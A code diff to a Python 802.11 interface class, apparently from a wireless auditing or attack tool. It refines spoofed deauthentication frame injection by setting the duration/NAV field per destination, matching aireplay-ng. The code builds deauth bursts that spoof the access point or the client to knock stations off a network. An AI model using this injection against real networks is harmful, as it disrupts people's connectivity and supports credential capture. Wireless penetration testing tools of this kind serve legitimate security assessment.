@@ -71,6 +71,23 @@ def _is_group_mac(mac: str) -> bool:
         return True   # unparseable → never treat as a client
 
 
+# SIFS + a 1 Mbps long-preamble ACK (µs) — the unicast-ACK NAV. Matches aireplay-ng's
+# hardcoded deauth duration (0x013A); our injectors default to 1 Mbps CCK, so this is the
+# time the addressed STA needs to ACK back.
+_DEAUTH_ACK_NAV_US = 0x013A
+
+
+def _deauth_nav_bytes(dest_mac: str) -> bytes:
+    """Little-endian duration/NAV for a deauth addressed to ``dest_mac`` (addr1).
+
+    A group-addressed (broadcast/multicast) destination is never ACKed → NAV 0; a unicast
+    destination reserves the medium for the SIFS + ACK it returns. The chip does NOT fill
+    this in for raw monitor-injected frames (mac80211 only computes NAV for its own managed
+    TX, not ``IEEE80211_TX_CTL_INJECTED`` frames), so we set it in the frame ourselves."""
+    nav = 0 if _is_group_mac(dest_mac) else _DEAUTH_ACK_NAV_US
+    return nav.to_bytes(2, "little")
+
+
 class WlanInterface:
     """High-level 802.11 abstraction for a hardware driver; the UI talks only to this class."""
     def __init__(self, driver_instance: Any, name: str, description: str,
@@ -657,16 +674,17 @@ class WlanInterface:
         ap_mac = self._to_mac_bytes(ap_bssid)
         cl_mac = self._to_mac_bytes(client_bssid)
 
-        # Frame Control: 0xC0 (Deauth, Mgmt), Flags: 0x00. Duration 0 (hardware fills).
+        # Frame Control: 0xC0 (Deauth, Mgmt), Flags: 0x00.
         # Reason Code 7 (class-3 frame from nonassociated STA), little-endian u16.
-        fc_dur = b"\xc0\x00\x00\x00"
+        fc = b"\xc0\x00"
         reason = b"\x07\x00"
         seq = b"\x00\x00"  # hardware overwrites the sequence number
 
         # Client deauth spoofs the AP as source; AP deauth spoofs the client.
-        # Addr1=Dest, Addr2=Source, Addr3=BSSID(AP) in both.
-        client_deauth = fc_dur + cl_mac + ap_mac + ap_mac + seq + reason
-        ap_deauth = fc_dur + ap_mac + cl_mac + ap_mac + seq + reason
+        # Addr1=Dest, Addr2=Source, Addr3=BSSID(AP) in both. Duration/NAV is keyed on the
+        # destination (addr1): unicast → the ACK NAV, broadcast → 0. See _deauth_nav_bytes.
+        client_deauth = fc + _deauth_nav_bytes(client_bssid) + cl_mac + ap_mac + ap_mac + seq + reason
+        ap_deauth = fc + _deauth_nav_bytes(ap_bssid) + ap_mac + cl_mac + ap_mac + seq + reason
 
         logger.info(f"Injecting Deauth Burst ({burst_count}x) on CH {target_chan}: "
                     f"{ap_bssid} <-> {client_bssid}")
